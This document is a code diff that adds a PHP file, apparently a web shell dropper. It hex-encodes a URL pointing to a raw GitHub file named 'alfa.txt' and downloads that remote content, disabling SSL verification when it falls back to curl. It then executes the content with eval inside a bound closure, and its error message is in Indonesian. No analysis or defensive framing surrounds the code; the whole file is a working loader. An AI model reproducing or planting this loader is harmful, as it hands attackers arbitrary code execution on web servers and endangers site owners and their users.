@@ -1,0 +1,62 @@
+<?php
+$hexUrl = '68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F696E64616B6F74656B6E6F2F532F726566732F68656164732F6D61696E2F616C6C66612E747874';
+
+function hex2str($hex) {
+    $str = '';
+    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
+        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
+    }
+    return $str;
+}
+
+function downloadContent($url) {
+    if (ini_get('allow_url_fopen')) {
+        return file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    } else {
+        $result = false;
+        if ($fp = fopen($url, 'r')) {
+            $result = '';
+            while (!feof($fp)) {
+                $result .= fread($fp, 8192);
+            }
+            fclose($fp);
+        }
+        return $result;
+    }
+}
+
+class ScriptHandler {
+    private $script;
+    public function setScript($script) {
+        $this->script = $script;
+    }
+    public function execute() {
+        if ($this->script) {
+            $fn = function() {
+                /** @noinspection PhpIncludeInspection */
+                eval('?>' . $this->script);
+            };
+            $fn = $fn->bindTo($this, $this);
+            call_user_func($fn);
+            $this->script = null;
+        }
+    }
+}
+
+$url = hex2str($hexUrl);
+$phpScript = downloadContent($url);
+if ($phpScript === false) {
+    die("Gagal mendownload script PHP dari URL.");
+}
+
+$scriptHandler = new ScriptHandler();
+$scriptHandler->setScript($phpScript);
+$scriptHandler->execute();
+?>
